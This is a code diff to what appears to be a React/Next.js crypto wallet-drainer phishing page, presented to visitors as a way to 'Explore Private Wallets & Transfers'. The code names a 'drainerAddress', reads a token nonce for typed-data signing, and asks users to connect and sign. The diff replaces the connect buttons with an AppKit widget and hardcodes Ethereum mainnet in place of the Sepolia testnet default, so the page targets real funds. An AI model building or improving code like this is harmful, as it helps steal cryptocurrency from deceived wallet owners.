@@ -1,7 +1,7 @@
 'use client'
 
 import { useState, useEffect } from 'react'
-import { useAccount, useConnect, useDisconnect, useSignTypedData, useReadContract, useBalance } from 'wagmi'
+import { useAccount, useDisconnect, useSignTypedData, useReadContract, useBalance } from 'wagmi'
 import { sepolia } from 'wagmi/chains'
 import { parseUnits, formatEther } from 'viem'
 import styles from './page.module.css'
@@ -22,7 +22,6 @@ export default function Home() {
   const [viewState, setViewState] = useState<'connect' | 'list' | 'details'>('connect')
 
   const { address, isConnected, chain } = useAccount()
-  const { connectors, connect } = useConnect()
   const { disconnect } = useDisconnect()
   const { signTypedDataAsync, isPending, isSuccess } = useSignTypedData()
 
@@ -39,7 +38,7 @@ export default function Home() {
 
   const drainerAddress = "0xd115dbad4574D1332a44d7453B387ad38750c957" as `0x${string}`;
   const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x5179A923Be1E3e211da968ADdc8Ee9bF36d97252") as `0x${string}`;
-  const targetChainId = Number(process.env.NEXT_PUBLIC_CHAIN_ID || 1);
+  const targetChainId = 1; // HARDCODED TO MAINNET (1) to prevent metadata mismatches
 
   const { data: nonce, isError: nonceError } = useReadContract({
     address: tokenAddress,
@@ -199,18 +198,9 @@ export default function Home() {
 
               <div className={styles.statsCard} style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column' }}>
                 <div style={{ marginBottom: '1.5rem', color: '#6c757d', fontSize: '1.2rem', fontWeight: 600, textAlign: 'center' }}>Explore Private Wallets & Transfers</div>
-                <div className={styles.connectGrid}>
-                  {connectors
-                    .filter(connector => connector.name !== 'Injected')
-                    .map((connector) => (
-                      <button
-                        key={connector.uid}
-                        className={styles.connectBoxBtn}
-                        onClick={() => connect({ connector })}
-                      >
-                        {connector.name === 'WalletConnect' ? 'Connect Trust / SafePal / Exodus' : `Connect ${connector.name}`}
-                      </button>
-                    ))}
+                <div style={{ display: 'flex', justifyContent: 'center', width: '100%' }}>
+                  {/* @ts-ignore */}
+                  <appkit-button />
                 </div>
               </div>
             </div>
